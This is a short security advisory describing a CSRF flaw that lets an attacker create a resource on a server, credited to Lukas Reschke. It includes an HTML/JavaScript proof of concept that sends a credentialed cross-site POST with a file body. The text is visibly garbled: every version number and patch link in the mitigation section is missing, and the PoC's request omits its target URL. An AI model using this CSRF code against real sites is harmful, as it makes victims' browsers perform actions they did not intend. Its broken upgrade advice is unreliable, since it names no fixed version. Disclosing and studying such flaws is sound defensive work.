This can be exploited to  create a resource via CSRF.  Mitigation: 2.4.x users upgrade to and apply the patch in  and/or upgrade to once released 2.6.x users upgrade to and apply the patch in  and/or upgrade to once released 2.8.x users upgrade to and apply the patch in  and/or upgrade to once released users should upgrade to users should upgrade to users should upgrade to  Example: A resource can be created like so: <html>    <body>      <script>        function submitRequest()        {          var xhr = new XMLHttpRequest();          xhr.open("POST", true);          xhr.withCredentials = true;          var body = "This file has been uploaded via CSRF.=\r\n";          var aBody = new Uint8Array(body.length);          for (var i = 0; i < aBody.length; i++)            aBody[i] = body.charCodeAt(i);          xhr.send(new Blob([aBody]));        }      </script>      <form action="#">        <input type="button" value="Submit request"  onclick="submitRequest();" />      </form>    </body> </html>  Credit: This issue was discovered by Lukas Reschke.
